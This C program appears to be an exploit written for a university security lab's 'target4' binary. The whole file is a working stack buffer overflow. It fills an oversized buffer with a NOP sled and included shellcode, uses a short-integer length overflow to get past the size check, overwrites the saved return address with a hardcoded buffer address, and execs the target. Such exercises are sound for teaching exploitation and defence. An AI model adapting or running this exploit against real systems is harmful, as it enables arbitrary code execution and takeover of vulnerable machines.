#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target4"

#define NOOP 0x90                 // no-op instruction
#define BUFLEN 96                 // target buffer length
#define SHORT_OVERFLOWN 0xffff    // short type overflowed by 1
#define SFP_LEN 4                 // byte length of saved frame pointer
#define RET_LEN 4                 // byte length of return address
#define LOCAL_MAXLEN_LEN 4        // byte length of local variable int maxlen
#define NULL_LEN 1                // byte length for null byte
#define BUF_START 0xfffedde4      // addr of the start of the buffer

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[SHORT_OVERFLOWN + NULL_LEN];

  memset(buf, NOOP, sizeof(buf) - 1);

  buf[SHORT_OVERFLOWN] = '\0';

  memcpy(buf, shellcode, sizeof(shellcode) - 1);

  *(unsigned int *)(buf + BUFLEN + LOCAL_MAXLEN_LEN + SFP_LEN) = BUF_START;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
